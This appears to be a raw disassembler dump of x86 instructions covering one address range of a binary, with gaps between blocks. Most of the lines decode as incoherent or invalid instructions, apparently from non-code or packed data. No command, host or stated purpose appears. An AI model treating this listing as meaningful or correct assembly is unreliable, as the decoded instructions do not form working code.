  42f90d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f90e:	into   
  42f90f:	mov    ebp,0xb392fe61
  42f914:	xor    edx,esi
  42f916:	inc    edx
  42f917:	adc    DWORD PTR [edi-0x36],esp
  42f91a:	int    0xb3
  42f91c:	dec    esp
  42f91d:	lods   eax,DWORD PTR ds:[esi]
  42f91e:	retf   
  42f91f:	cli    
  42f920:	lods   eax,DWORD PTR ds:[esi]
  42f921:	pusha  
  42f922:	jmp    0xed96cb7d
  42f927:	mov    dl,0x8a
  42f929:	mov    bl,0xbf
  42f92b:	fadd   QWORD PTR [esi-0x19bd2805]
  42f931:	call   0xeee2171e
  42f936:	jge    0x42f903
  42f938:	clc    
  42f939:	mov    bh,BYTE PTR [edx+0xd502573]
  42f93f:	and    eax,0xc9
	...
  42f9b4:	in     eax,0xba
  42f9b6:	xchg   edx,eax
  42f9b7:	jecxz  0x42f998
  42f9b9:	jmp    0x42f9b0
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	push   DWORD PTR [edi+0x49]
  42f9c3:	jo     0x42fa12
  42f9c5:	test   BYTE PTR [ecx],0x0
  42f9c8:	cmc    
  42f9c9:	add    BYTE PTR [eax],al
  42f9cb:	add    BYTE PTR [ebx+0x6f],ch
  42f9ce:	sbb    BYTE PTR [ebx-0x60d58f39],cl
  42f9d4:	or     ah,BYTE PTR [edx-0x4be9e110]
  42f9da:	lock mov al,0xc
  42f9dd:	pop    ebp
  42f9de:	mov    ?,WORD PTR [eax]
  42f9e0:	sbb    DWORD PTR [eax+0x7e],eax
  42f9e3:	lds    ebp,FWORD PTR [esi]
  42f9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f9e6:	xchg   BYTE PTR [ecx+0x3f8b0b2a],dh
  42f9ec:	inc    esp
  42f9ed:	dec    esi
  42f9ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9ef:	mov    ebp,0xecc7cdd5
  42f9f4:	cmp    al,0x2a
  42f9f6:	sub    eax,0x1db6a656
  42f9fb:	push   eax
  42f9fc:	inc    eax
  42f9fd:	sbb    al,0x21
  42f9ff:	adc    edx,DWORD PTR [esi*1-0x5ca54f21]
  42fa06:	xor    al,0x92
  42fa08:	xchg   edx,eax
  42fa09:	cmc    
  42fa0a:	xor    cl,0x30
  42fa0d:	sbb    al,0x18
  42fa0f:	not    BYTE PTR [ecx+0x4f]
  42fa12:	xchg   edi,eax
  42fa13:	dec    ebx
  42fa14:	ror    BYTE PTR [ecx*8+0x2b89be7a],cl
  42fa1b:	jg     0x42fa78
  42fa1d:	loopne 0x42fa36
  42fa1f:	js     0x42fa08
  42fa21:	das    
  42fa22:	stos   DWORD PTR es:[edi],eax
  42fa23:	loope  0x42fa2e
  42fa25:	xor    dl,BYTE PTR [esp+esi*4]
  42fa28:	and    dh,BYTE PTR es:[esi+0x110d2b24]
  42fa2f:	xchg   esi,eax
  42fa30:	fnsave [esi+0x1c]
  42fa33:	xor    bh,cl
  42fa35:	sub    BYTE PTR [ebp+0x8c81fe1],dl
  42fa3b:	add    BYTE PTR ds:0x3f5b8f81,0x81
  42fa42:	popf   
  42fa43:	xor    esp,DWORD PTR [esi-0x59]
  42fa46:	and    BYTE PTR [edx],ch
  42fa48:	rcl    BYTE PTR [ecx],1
  42fa4a:	fwait
  42fa4b:	push   0xfffffffb
  42fa4d:	lds    eax,FWORD PTR [eax]
  42fa4f:	sbb    dh,BYTE PTR [eax+0x6e]
  42fa52:	inc    ecx
  42fa53:	ja     0x42facf
  42fa55:	daa    
  42fa56:	fisttp DWORD PTR [eax-0x2e]
  42fa59:	mov    esp,0xedd8d7ad
  42fa5e:	pop    ebp
  42fa5f:	xor    ebp,DWORD PTR [eax+0x7d]
  42fa62:	jmp    0x42fa79
  42fa64:	xchg   ebx,eax
  42fa65:	adc    BYTE PTR [edx],bl
  42fa67:	ror    DWORD PTR [edi+edx*8-0x54ef905c],cl
  42fa6e:	xor    cl,ah
  42fa70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa71:	mov    edi,0xf7899c1f
  42fa76:	or     dh,BYTE PTR [ebx]
  42fa78:	xor    ecx,ebx
  42fa7a:	mov    ds:0x45b298b4,al
  42fa7f:	imul   eax,DWORD PTR [edi-0x29],0x31
  42fa83:	mov    esi,0x1e60e72d
  42fa88:	fbld   TBYTE PTR [edx-0x2944dea7]
  42fa8e:	inc    DWORD PTR [edx+0x2f69af2]
  42fa94:	add    eax,0x7ac075c4
  42fa99:	int    0x3e
  42fa9b:	shl    BYTE PTR [ebx-0x75],0x6a
  42fa9f:	mov    edx,edi
  42faa1:	pop    edx
  42faa2:	jmp    0x8488:0x69747b8f
  42faa9:	jle    0x42fa48
  42faab:	pop    es
  42faac:	jae    0x42fae9
  42faae:	daa    
  42faaf:	jo     0x42fa71
  42fab1:	sar    DWORD PTR [edi],0xb0
  42fab4:	inc    esp
  42fab5:	jnp    0x42faeb
  42fab7:	add    BYTE PTR ds:0xf9e2ae00,0x15
  42fabe:	(bad)  
  42fabf:	rol    DWORD PTR [bx+si],0x0
	...
  42fb33:	add    BYTE PTR [esi+0x41],bh
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	(bad)  [ebp+0x66]
  42fb43:	int    0x42
  42fb45:	test   DWORD PTR [ecx],0xf500
  42fb4b:	add    BYTE PTR [ebx-0x6dae8be5],cl
  42fb51:	cmp    edi,ecx
  42fb53:	and    eax,DWORD PTR [edx+edi*2+0x4b]
  42fb57:	daa    
  42fb58:	pop    edx
  42fb59:	enter  0x73f6,0xcb
  42fb5d:	daa    
  42fb5e:	into   
  42fb5f:	mov    ch,0xd4
  42fb61:	imul   edx,DWORD PTR [ebp+0xf],0x43eac604
  42fb68:	mov    DWORD PTR [edx+0x16],ebp
  42fb6b:	or     DWORD PTR [ebx+0x33],ebp
  42fb6e:	scas   al,BYTE PTR es:[edi]
  42fb6f:	mov    dl,0x8d
  42fb71:	es ret 0xe0eb
  42fb75:	lods   al,BYTE PTR ds:[esi]
  42fb76:	and    ah,BYTE PTR [ecx+0x67358adc]
  42fb7c:	pusha  
  42fb7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb7e:	mov    ecx,0xa0da782
  42fb83:	mov    eax,0x95cba7c2
  42fb88:	call   0xbc2ad6ab
  42fb8d:	push   ds
  42fb8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb8f:	stc    
  42fb90:	adc    eax,0xa7567aec
  42fb95:	xor    eax,0x4f78ccf5
  42fb9a:	repnz mov BYTE PTR [ecx+0x61],dh
  42fb9e:	shl    BYTE PTR [esi+0x70a191f1],1
  42fba4:	test   BYTE PTR [esi],al
  42fba6:	fwait
  42fba7:	add    al,0xe9
  42fba9:	retf   
  42fbaa:	add    BYTE PTR ds:0xec29bbb4,bh
  42fbb0:	inc    ebx
  42fbb1:	jl     0x42fbc3
  42fbb3:	mov    esi,0x77bf7110
  42fbb8:	pushf  
  42fbb9:	push   edi
  42fbba:	pop    ds
  42fbbb:	cmc    
  42fbbc:	mov    edi,ebx
  42fbbe:	dec    esp
  42fbbf:	js     0x42fbf0
  42fbc1:	dec    eax
  42fbc2:	mov    bh,0x41
  42fbc4:	das    
  42fbc5:	lods   eax,DWORD PTR ds:[esi]
  42fbc6:	je     0x42fb80
  42fbc8:	scas   eax,DWORD PTR es:[edi]
  42fbc9:	add    DWORD PTR [edx],eax
  42fbcb:	add    eax,ebx
  42fbcd:	cmp    BYTE PTR fs:[eax+0x16],ch
  42fbd1:	lahf   
  42fbd2:	icebp  
  42fbd3:	jl     0x42fc28
  42fbd5:	(bad)  
  42fbd7:	mov    edi,0x9d491f6
  42fbdc:	lods   al,BYTE PTR ds:[esi]
  42fbdd:	out    dx,al
  42fbde:	jl     0x42fbb8
  42fbe0:	dec    ebp
  42fbe1:	repnz (bad) 
  42fbe3:	adc    al,ch
  42fbe5:	(bad)  
  42fbe6:	scas   eax,DWORD PTR es:[edi]
  42fbe7:	adc    eax,0x51aa5717
  42fbec:	shr    BYTE PTR [edi],1
  42fbee:	outs   dx,DWORD PTR ds:[esi]
  42fbef:	adc    BYTE PTR ds:0x82a13aa0,ch
  42fbf5:	pop    ecx
  42fbf6:	and    eax,0xce09bf7c
  42fbfb:	dec    edi
  42fbfc:	in     al,0x1
  42fbfe:	or     al,BYTE PTR [edx+0x5]
  42fc01:	and    al,0xd3
  42fc03:	adc    cl,dh
  42fc05:	mov    cl,0x3b
  42fc07:	push   ss
  42fc08:	pop    edx
  42fc09:	jl     0x42fc6c
  42fc0b:	and    BYTE PTR [ebx+eax*1+0x463a8c11],ch
  42fc12:	push   0x4d86217d
  42fc17:	push   esi
  42fc18:	dec    esp
  42fc19:	mov    DWORD PTR [ecx],ecx
  42fc1b:	in     al,dx
  42fc1c:	sbb    bh,ah
  42fc1e:	imul   BYTE PTR [ebx+0x4d064d40]
  42fc24:	jg     0x42fc29
  42fc26:	nop
  42fc27:	xor    ch,BYTE PTR [ebp+ecx*1+0x6059cd03]
  42fc2e:	jp     0x42fc4d
  42fc30:	and    eax,0x971e352c
  42fc35:	call   DWORD PTR [ebp+esi*2-0x58]
  42fc39:	push   esi
  42fc3a:	mov    ebx,0xd109759d
  42fc3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fc40:	cwde   
	...
  42fcb1:	add    BYTE PTR [eax],al
  42fcb3:	add    BYTE PTR [edx],ch
  42fcb5:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42fcbb:	test   BYTE PTR [ecx-0x1d46a3c4],0xdf
  42fcc2:	aas    
  42fcc3:	jae    0x42fcfc
  42fcc5:	clc    
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	cmc    
  42fcc9:	add    BYTE PTR [eax],al
  42fccb:	add    BYTE PTR ds:0x48f85a2d,ah
  42fcd1:	pushf  
  42fcd2:	inc    ebp
  42fcd3:	add    eax,0xc51e7da6
  42fcd8:	and    eax,0x9a4074a3
  42fcdd:	cli    
  42fcde:	repz mov al,ds:0x6388228e
  42fce4:	fwait
  42fce5:	int3   
  42fce6:	jge    0x42fd66
  42fce8:	test   eax,0x61259c40
  42fced:	outs   dx,BYTE PTR ds:[esi]
  42fcee:	dec    edx
  42fcef:	adc    DWORD PTR [ebp-0x1f],edi
  42fcf2:	push   edx
  42fcf3:	shr    ebp,0x10
  42fcf6:	std    
  42fcf7:	mov    ch,0x29
  42fcf9:	dec    ebp
  42fcfa:	int    0xac
  42fcfc:	in     al,0x5
  42fcfe:	jge    0x42fd7d
  42fd00:	(bad)  
  42fd01:	push   ebp
  42fd02:	xchg   edx,eax
  42fd03:	jge    0x42fccf
  42fd05:	mov    ds:0x468be90f,eax
  42fd0a:	pop    ebp
  42fd0b:	adc    ecx,ecx
  42fd0d:	xor    ecx,ebx
  42fd0f:	(bad)  
  42fd10:	jnp    0x42fd38
  42fd12:	out    0x7d,eax
  42fd14:	push   esi
  42fd15:	aad    0xb3
  42fd17:	aaa    
  42fd18:	or     DWORD PTR [esi-0x78],0x56
  42fd1c:	xchg   esp,eax
  42fd1d:	imul   esi,DWORD PTR [edx+eax*8+0xb],0xab83e8f4
  42fd25:	stos   BYTE PTR es:[edi],al
  42fd26:	push   edx
  42fd27:	fs stc 
  42fd29:	aas    
  42fd2a:	fdivr  QWORD PTR [esi+esi*4-0x67]
  42fd2e:	ret    0xac3f
  42fd31:	pop    ebp
  42fd32:	inc    ebp
  42fd33:	ret    
  42fd34:	mov    eax,0xa2f50525
  42fd39:	fs or  eax,esi
  42fd3c:	pop    edi
  42fd3d:	jno    0x42fd03
  42fd3f:	ret    
  42fd40:	xor    dl,BYTE PTR [esp+eiz*8-0x13]
  42fd44:	cmp    dh,BYTE PTR [eax]
  42fd46:	mov    bh,0x3c
  42fd48:	gs jle 0x42fd86
  42fd4b:	out    0x8a,al
  42fd4d:	cmp    DWORD PTR [ebx+0x3c71b5dd],0x20dec075
  42fd57:	aad    0x48
  42fd59:	dec    esp
  42fd5a:	sbb    ah,dl
  42fd5c:	jae    0x42fdbf
  42fd5e:	add    BYTE PTR [ebx-0xe3badee],bl
  42fd64:	fistp  DWORD PTR [edx-0x7e]
  42fd67:	jnp    0x39c71c30
  42fd6d:	xchg   edi,eax
  42fd6e:	hlt    
  42fd6f:	out    0x77,eax
  42fd71:	pop    ebx
  42fd72:	xor    al,0x4b
  42fd74:	loop   0x42fd42
  42fd76:	push   ebx
  42fd77:	frstor [ebx-0x241e0244]
  42fd7e:	push   esp
  42fd7f:	mov    edi,0xfc83b0f9
  42fd84:	mov    DWORD PTR [ecx],esi
  42fd86:	jne    0x42fd42
  42fd88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd89:	imul   edi,DWORD PTR [esi],0x60b6be93
  42fd8f:	test   al,0x2c
  42fd91:	(bad)
  42fd94:	lods   eax,DWORD PTR ds:[esi]
  42fd95:	xchg   ebp,eax
  42fd96:	mov    WORD PTR [eax],?
  42fd98:	inc    esp
  42fd99:	fstp   DWORD PTR [esi+0x26]
  42fd9c:	xor    al,0x34
  42fd9e:	dec    edi
  42fd9f:	jle    0x42fda0
  42fda1:	lods   al,BYTE PTR ds:[esi]
  42fda2:	std    
  42fda3:	ss jmp 0x42fdd1
  42fda6:	mov    ecx,0x533581a4
  42fdab:	(bad)  
  42fdac:	xchg   ebp,eax
  42fdad:	dec    ebp
  42fdae:	mov    bh,0xcf
  42fdb0:	pcmpgtd mm1,QWORD PTR [ebp-0x629e8b3a]
  42fdb7:	xchg   ebp,eax
  42fdb8:	pop    ecx
  42fdb9:	repnz mov DWORD PTR [edx+0xd],eax
  42fdbd:	mov    dh,0xb7
  42fdbf:	push   edx
  42fdc0:	mov    DWORD PTR [eax],0x0
	...
  42fe32:	add    BYTE PTR [eax],al
  42fe34:	ret    
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	pop    eax
  42fe41:	pop    ebx
  42fe42:	pop    ebp
  42fe43:	jp     0x42fe71
  42fe45:	stc    
  42fe46:	add    DWORD PTR [eax],eax
  42fe48:	cmc    
  42fe49:	add    BYTE PTR [eax],al
  42fe4b:	add    BYTE PTR [ecx],ah
  42fe4d:	xlat   BYTE PTR ds:[ebx]
  42fe4e:	push   edi
  42fe4f:	jmp    0x42feb7
  42fe51:	mov    dh,0xe3
  42fe53:	jnp    0x42fe86
  42fe55:	fisttp QWORD PTR es:[ebp+edx*1-0x29]
  42fe5a:	sbb    eax,0x4b8e1b41
  42fe5f:	mov    ebx,0xd77761d0
  42fe64:	adc    al,0x74
  42fe66:	push   ecx
  42fe67:	repnz mov ebp,0x9cbd42f
  42fe6d:	pop    ss
  42fe6e:	push   ecx
  42fe6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe70:	aad    0xf5
  42fe72:	outs   dx,BYTE PTR ds:[esi]
  42fe73:	lods   al,BYTE PTR ds:[esi]
  42fe74:	dec    esi
  42fe75:	outs   dx,DWORD PTR ds:[esi]
  42fe76:	add    eax,0x453a017a
  42fe7b:	push   ebp
  42fe7c:	inc    ecx
  42fe7d:	xor    eax,DWORD PTR [ecx-0x1a90645d]
  42fe83:	leave  
  42fe84:	xchg   esi,eax
  42fe85:	pop    edx
  42fe86:	or     al,0x4d
  42fe88:	mov    DWORD PTR [ebp+0x4b],esi
  42fe8b:	jge    0x42fe16
  42fe8d:	cmp    BYTE PTR [ecx+ecx*4],dl
  42fe90:	jne    0x42fe39
  42fe92:	popa   
  42fe93:	xor    ch,BYTE PTR [edx+0x7fde282a]
  42fe99:	cmp    al,0xdc
  42fe9b:	cmp    esp,DWORD PTR [edx]
  42fe9d:	jns    0x42feee
  42fe9f:	mov    ecx,0x4855b4b0
  42fea4:	jb     0x42fed9
  42fea6:	and    eax,0xc6941ea3
  42feab:	test   al,0xb6
  42fead:	mov    ch,0x2f
  42feaf:	xlat   BYTE PTR ds:[ebx]
  42feb0:	fistp  WORD PTR [ebx+ebx*8-0x57]
  42feb4:	int    0x21
  42feb6:	ins    BYTE PTR es:[edi],dx
  42feb7:	sbb    dh,BYTE PTR [ebx]
  42feb9:	push   edx
  42feba:	inc    esi
  42febb:	out    dx,al
  42febc:	mov    bl,BYTE PTR [ebx-0x2b]
  42febf:	fild   QWORD PTR [ecx-0x2d]
  42fec2:	imul   esp,edi,0x19958f58
  42fec8:	push   ecx
  42fec9:	mov    esi,0xcd4a781a
  42fece:	push   es
  42fecf:	les    edx,FWORD PTR [ecx-0x265af836]
  42fed5:	add    edx,DWORD PTR [esi-0x71]
  42fed8:	es mov ebx,0x311f46aa
  42fede:	int    0x99
  42fee0:	jbe    0x42ff61
  42fee2:	(bad)  
  42fee3:	(bad)  
  42fee5:	sub    bh,BYTE PTR cs:[ecx+0x62]
  42fee9:	mov    eax,0x565bf753
  42feee:	inc    ebp
  42feef:	imul   ebp,DWORD PTR [ebp+0x3f],0x2c
  42fef3:	push   ds
  42fef4:	xchg   esi,eax
  42fef5:	push   edx
  42fef6:	bound  edx,QWORD PTR [ebx+0x4dd060b9]
  42fefc:	cwde   
  42fefd:	std    
  42fefe:	into   
  42feff:	mov    al,BYTE PTR [ebp+eax*4-0x41]
  42ff03:	push   ebx
  42ff04:	ret    0xcdd8
  42ff07:	xor    BYTE PTR [esi+0x18],dh
  42ff0a:	cmp    al,BYTE PTR [ecx]
  42ff0c:	pop    esi
  42ff0d:	push   edi
  42ff0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ff0f:	mov    al,0x97
  42ff11:	std    
  42ff12:	jo     0x42ff66
  42ff14:	xchg   BYTE PTR [ebx-0x3d],bh
  42ff17:	fsubr  DWORD PTR [ebx+0x20a53585]
  42ff1d:	int3   
  42ff1e:	xor    DWORD PTR [eax+0x5419af78],eax
  42ff24:	popf   
  42ff25:	cmp    bh,al
  42ff27:	jno    0x42ff7f
  42ff29:	call   0xd38d3af5
  42ff2e:	movaps XMMWORD PTR [ebp+0x76],xmm2
  42ff32:	mov    ebx,0x5b492006
  42ff37:	std    
  42ff38:	outs   dx,BYTE PTR ds:[esi]
  42ff39:	(bad)  
  42ff3a:	sti    
  42ff3b:	test   BYTE PTR ds:0x9267c3f8,bl
	...
  42ffb1:	add    BYTE PTR [eax],al
  42ffb3:	add    BYTE PTR [edx],dl
  42ffb5:	ds int 0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx+0x5897fea]
  42ffc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ffc2:	ror    DWORD PTR [ecx+0x21],cl
  42ffc5:	cli    
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	cmc    
  42ffc9:	add    BYTE PTR [eax],al
  42ffcb:	add    BYTE PTR [esi+0x1a],ah
  42ffce:	mov    edi,0xc8b01cef
  42ffd3:	repnz int 0xd4
  42ffd6:	dec    edx
  42ffd7:	cld    
  42ffd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ffd9:	sub    esp,DWORD PTR [edx]
  42ffdb:	or     eax,esp
  42ffdd:	int3   
  42ffde:	and    eax,0xa9c9924d
  42ffe3:	rol    BYTE PTR [esi],1
  42ffe5:	loopne 0x43003a
  42ffe7:	inc    esp
  42ffe8:	xchg   esp,eax
  42ffe9:	inc    ebp
  42ffea:	aaa    
  42ffeb:	fist   DWORD PTR [edi-0x18980fc3]
  42fff1:	mov    eax,0x54382c5d
  42fff6:	cmp    BYTE PTR [eax+0x6b652b2f],dl
  42fffc:	lods   al,BYTE PTR ds:[esi]
  42fffd:	mov    ecx,0x62cdb2b4
  430002:	mov    ds:0xbe6dae5f,al
  430007:	push   ss
  430008:	pop    ss
  430009:	or     ebx,DWORD PTR [eax+0x23705dc7]
  43000f:	push   DWORD PTR [ebp-0x1f]
  430012:	and    al,0xd6
  430014:	jnp    0x43002f
  430016:	mov    ds:0x4b13a775,eax
  43001b:	es (bad) 
  43001d:	adc    al,0x10
  43001f:	pop    DWORD PTR [edi+esi*1-0x69a21f5f]
  430026:	pop    edi
  430027:	jge    0x42fff8
  430029:	mov    es,WORD PTR [ebp-0x3d]
  43002c:	arpl   WORD PTR [edx],bp
  43002e:	mov    bh,0xed
  430030:	jnp    0x430031
  430032:	adc    bl,dh
  430034:	cmp    eax,DWORD PTR [eax-0x34]
  430037:	out    0x19,al
  430039:	mov    ds:0x5081be9b,al
  43003e:	mov    al,ds:0x4ec94934
  430043:	pop    edi
  430044:	push   ecx
  430045:	pusha  
  430046:	mov    dh,0x51
  430048:	xor    al,0xe9
  43004a:	sbb    DWORD PTR [ebp+0x4c122e2c],edi
  430050:	mov    edx,0xf83e88ef
  430055:	in     al,0xe2
  430057:	popf   
  430058:	xchg   edx,eax
  430059:	cmp    eax,DWORD PTR [esp+edi*2-0x3f]
  43005d:	dec    ecx
  43005e:	pop    ss
  43005f:	sub    eax,0x61c64d82
  430064:	shl    bl,0x36
  430067:	xchg   BYTE PTR [edi-0x13],cl
  43006a:	loop   0x43000a
  43006c:	ret    0x4066
  43006f:	mov    bh,0x6f
  430071:	je     0x430037
  430073:	into   
  430074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430075:	repz (bad) 
  430077:	ret    
  430078:	lods   eax,DWORD PTR ds:[esi]
  430079:	pop    esp
  43007a:	inc    ebx
  43007b:	sbb    cl,BYTE PTR [ecx+0x40]
  43007e:	push   ss
  43007f:	in     eax,0x74
  430081:	arpl   WORD PTR [ebx],cx
  430083:	sbb    ebx,DWORD PTR [edi+eax*2-0xc]
  430087:	(bad)  
  430088:	xor    edi,DWORD PTR [esi+ecx*8-0x27597cf3]
  43008f:	fbstp  TBYTE PTR [esi+edx*8-0x4a501858]
  430096:	ror    BYTE PTR [edx+0x21],1
  430099:	sub    BYTE PTR [eax+0x47],0x56
  43009d:	das    
  43009e:	test   ch,0xe
  4300a1:	dec    edi
  4300a2:	inc    eax
  4300a3:	xor    eax,0x6151b60f
  4300a8:	int    0x19
  4300aa:	adc    eax,0xe6195d7c
  4300af:	fidiv  WORD PTR [esi+0x7a76617c]
  4300b5:	int    0x30
  4300b7:	ins    BYTE PTR es:[edi],dx
  4300b8:	call   0xeecd005a
  4300bd:	(bad)  
  4300be:	mov    ebp,edx
  4300c0:	test   BYTE PTR [eax],al
	...
  430132:	add    BYTE PTR [eax],al
  430134:	pop    edx
  430135:	es jecxz 0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0xc647:0xd2d2a608
  430144:	push   ss
  430145:	sti    
  430146:	add    DWORD PTR [eax],eax
  430148:	cmc    
  430149:	add    BYTE PTR [eax],al
  43014b:	add    BYTE PTR [esi-0x74067048],dh
  430151:	mov    bl,0x83
  430153:	int    0x8
  430155:	xlat   BYTE PTR ds:[ebx]
  430156:	sub    al,0x13
  430158:	fidiv  WORD PTR [ebp-0x51]
  43015b:	test   BYTE PTR [esi-0x64900f4b],al
  430161:	out    dx,eax
  430162:	xlat   BYTE PTR ds:[ebx]
  430163:	fwait
  430164:	idiv   BYTE PTR fs:[edi]
  430167:	data16 jl 0x430150
  43016a:	xchg   edx,eax
  43016b:	cmp    al,bl
  43016d:	leave  
  43016e:	sahf   
  43016f:	rcr    BYTE PTR [eax+0x335e220c],1
  430175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430176:	test   eax,0x324e746d
  43017b:	xchg   ebp,eax
  43017c:	stc    
  43017d:	and    ebp,DWORD PTR [ecx+0x1b6b957b]
  430183:	and    DWORD PTR [esi+0x64],edi
  430186:	mov    ebx,0x707a92ff
  43018b:	push   ebp
  43018c:	xlat   BYTE PTR ds:[ebx]
  43018d:	jecxz  0x43012a
  43018f:	push   edi
  430190:	call   0x53166589
  430195:	or     al,0x3e
  430197:	push   es
  430198:	sbb    BYTE PTR [esi-0x2ae7a0cb],bh
  43019e:	cmp    eax,0x5272394b
  4301a3:	xchg   BYTE PTR [edi],dh
  4301a5:	push   ebp
  4301a6:	je     0x43019c
  4301a8:	retf   
  4301a9:	imul   eax,DWORD PTR [edx+0x37d66e04],0x1be444a0
  4301b3:	popa   
  4301b4:	fs enter 0xfcf5,0x58
  4301b9:	dec    ecx
  4301ba:	add    eax,0xd8f8c55b
  4301bf:	daa    
  4301c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4301c1:	push   0xffffffa9
  4301c3:	clc    
  4301c4:	mov    ebx,0x1fa92684
  4301c9:	cs retf 0xe77b
  4301cd:	dec    edx
  4301ce:	mov    esp,0x65b03edb
  4301d3:	add    BYTE PTR [eax],cl
  4301d5:	stos   DWORD PTR es:[edi],eax
  4301d6:	sbb    eax,DWORD PTR [ecx-0x66c9d93a]
  4301dc:	sub    DWORD PTR [ecx+0xa],esp
  4301df:	cmp    ebx,edx
  4301e1:	shl    DWORD PTR [ecx+0x3],0x9a
  4301e5:	xchg   DWORD PTR [edi-0x716bc467],edx
  4301eb:	sub    dh,BYTE PTR [eax]
  4301ed:	adc    BYTE PTR [ecx+0x74f1a3f7],0x73
  4301f4:	test   esp,ebx
  4301f6:	adc    eax,0xa003c5db
  4301fb:	call   0xe565699e
  430200:	dec    edi
  430201:	test   DWORD PTR [eax+0x21aa8ebb],ebx
  430207:	xor    al,0xb3
  430209:	pop    edi
  43020a:	call   0x4a1b:0x1e08c15e
  430211:	out    dx,al
  430212:	adc    cl,BYTE PTR [ebp+0x70]
  430215:	and    al,0x3b
  430217:	dec    BYTE PTR ds:0x7defd917
  43021d:	outs   dx,BYTE PTR ds:[esi]
  43021e:	mov    esi,0x3eb6e282
  430223:	cmc    
  430224:	mov    es,ebx
  430226:	sbb    esi,DWORD PTR [esi+0x79b2ebe9]
  43022c:	adc    BYTE PTR ds:0x8fc16aa4,dh
  430232:	das    
  430233:	test   eax,0x5cfa353b
  430238:	(bad)  
  430239:	xor    eax,DWORD PTR [ebx-0x2f]
  43023c:	out    0x7a,eax
  43023e:	mov    gs,WORD PTR [ebx]
  430240:	cmp    BYTE PTR [eax],al
	...
  4302b2:	add    BYTE PTR [eax],al
  4302b4:	mov    ebp,0xaf8a081a
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	mov    eax,0xb52bb33
  4302c5:	cld    
  4302c6:	add    DWORD PTR [eax],eax
  4302c8:	cmc    
  4302c9:	add    BYTE PTR [eax],al
  4302cb:	add    BYTE PTR [edi-0x5c5142a3],al
  4302d1:	xor    BYTE PTR [esi+ebx*8],bl
  4302d4:	xor    esp,DWORD PTR [ecx-0x2e112272]
  4302da:	aam    0x84
  4302dc:	js     0x430348
  4302de:	lods   al,BYTE PTR ds:[esi]
  4302df:	ss pop edi
  4302e1:	mov    BYTE PTR [ebx+esi*8],al
  4302e4:	setbe  BYTE PTR [ecx]
  4302e7:	jle    0x4302c1
  4302e9:	loope  0x43029a
  4302eb:	jmp    0xbbe7164d
  4302f0:	and    al,0x74
  4302f2:	inc    ebp
  4302f3:	call   0x51aca157
  4302f8:	mov    edx,0xd09d54d6
  4302fd:	(bad)  
  4302fe:	sub    eax,0xa60f3ecf
  430303:	fistp  DWORD PTR [ebx+0x6d]
  430306:	mov    esi,0x2057ad25
  43030b:	fdivr  QWORD PTR [edi]
  43030d:	fnstcw WORD PTR [edx+0x35]
  430310:	lods   eax,DWORD PTR ds:[esi]
  430311:	sub    eax,0xb92848c0
  430316:	retf   0xf411
  430319:	in     eax,dx
  43031a:	xor    al,0x69
  43031c:	mul    BYTE PTR [ebp-0x1b]
  43031f:	sbb    ah,BYTE PTR [ecx-0x5ba12eff]
  430325:	jmp    0x22ad:0x1b2236a1
  43032c:	sbb    edx,DWORD PTR [ebp+eiz*8-0x21]
  430330:	mov    al,BYTE PTR [ebp+0x21c2e01f]
  430336:	jmp    0x430397
  430338:	lds    ebx,FWORD PTR [edx+0x55e1c04a]
  43033e:	xor    al,0x70
  430340:	xchg   ecx,eax
  430341:	in     eax,0x99
  430343:	lods   eax,DWORD PTR ds:[esi]
  430344:	push   ds
  430345:	in     eax,0x42
  430347:	xor    DWORD PTR [edi+0x3b],ebx
  43034a:	ins    BYTE PTR es:[edi],dx
  43034b:	jmp    0x2b61:0x93d6dc87
  430352:	and    bl,BYTE PTR [edi-0x36]
  430355:	mul    BYTE PTR [eax+0x546a9a0f]
  43035b:	jl     0x43036e
  43035d:	rcr    BYTE PTR [edi-0x447450c],0xc0
  430364:	mov    esi,0x22fabad9
  430369:	push   esi
  43036a:	mov    al,ds:0xedacc1cb
  43036f:	cmp    BYTE PTR [esi-0x37],cl
  430372:	xor    eax,0x7a3b7bd7
  430377:	nop
  430378:	mov    al,0xa5
  43037a:	jns    0x430313
  43037c:	dec    ebx
  43037d:	xchg   DWORD PTR [edx+0x2dd8fa74],edx
  430383:	aad    0x18
  430385:	aas    
  430386:	mov    esi,0x9429a6bb
  43038b:	mov    cl,bh
  43038d:	xlat   BYTE PTR ds:[ebx]
  43038e:	dec    ebp
  43038f:	(bad)  
  430390:	inc    BYTE PTR [eax-0x70]
  430393:	cmp    bl,BYTE PTR [ebx+0x1d]
  430396:	in     al,0xa6
  430398:	sbb    BYTE PTR [ebx-0x2f],ah
  43039b:	sub    BYTE PTR [ebp-0x2f371b07],dh
  4303a1:	push   0xfffffff5
  4303a3:	psrlw  mm3,mm7
  4303a6:	int    0x9d
  4303a8:	pusha  
